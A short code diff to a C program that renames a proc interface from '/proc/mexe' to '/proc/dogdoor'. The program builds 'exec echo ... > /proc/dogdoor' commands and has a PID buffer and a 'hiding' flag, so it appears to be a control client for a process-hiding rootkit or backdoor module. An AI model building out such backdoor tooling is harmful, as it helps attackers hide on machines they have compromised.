@@ -8,9 +8,9 @@ void print_help();
 int main() {
 	int type;
 	char pid[50] = "";
-//    const char* PROC_PATH = "/proc/mexe";
+//    const char* PROC_PATH = "/proc/dogdoor";
     const char* command_echo1 = "exec echo ";
-    const char* command_echo2 = " > /proc/mexe";
+    const char* command_echo2 = " > /proc/dogdoor";
     bool hiding = false;
     while(1) {
         type = mselect();
